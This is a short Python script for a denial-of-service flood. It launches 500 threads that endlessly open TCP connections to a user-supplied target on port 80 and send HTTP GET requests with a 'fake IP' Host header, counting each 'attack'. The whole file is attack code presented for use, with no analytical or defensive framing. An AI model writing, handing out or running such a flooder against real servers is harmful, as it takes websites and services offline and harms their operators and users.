import socket
import threading

# Add the IP address of your target
target = ''
# Fake IP address
fake_ip = ''
# Port being targeted on the server
port = 80

attack_num = 0

def anarchy():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        # Prints how many attacks are being initiated
        print(attack_num)

        s.close()
# Loops entire attack on the server being targeted
for i in range(500):
    thread = threading.Thread(target=anarchy)
    thread.start()